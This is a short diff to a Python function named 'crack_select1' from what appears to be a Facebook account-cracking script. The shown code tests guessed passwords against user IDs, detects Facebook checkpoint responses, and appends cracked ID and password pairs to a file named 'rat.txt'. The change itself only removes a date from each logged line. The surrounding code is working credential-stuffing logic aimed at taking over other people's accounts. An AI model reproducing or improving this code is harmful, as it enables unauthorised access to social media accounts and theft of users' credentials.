@@ -436,7 +436,7 @@ def crack_select1():
 																		if "www.facebook.com" in data.json()['error_msg']:
 																			print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass8+"\033[0;97m")
 																			cp = open("rat.txt", "a")
-																			cp.write(today+" | "+uid+" | "+pass8+"\n")
+																			cp.write(uid+" | "+pass8+"\n")
 																			cp.close()
 																			cps.append(uid+pass8)
 																		else:
@@ -493,7 +493,7 @@ def crack_select1():
 																								if "www.facebook.com" in data.json()['error_msg']:
 																									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass11+"\033[0;97m")
 																									cp = open("rat.txt", "a")
-																									cp.write(today+" | "+uid+" | "+pass11+"\n")
+																									cp.write(uid+" | "+pass11+"\n")
 																									cp.close()
 																									cps.append(uid+pass11)
 																								else:
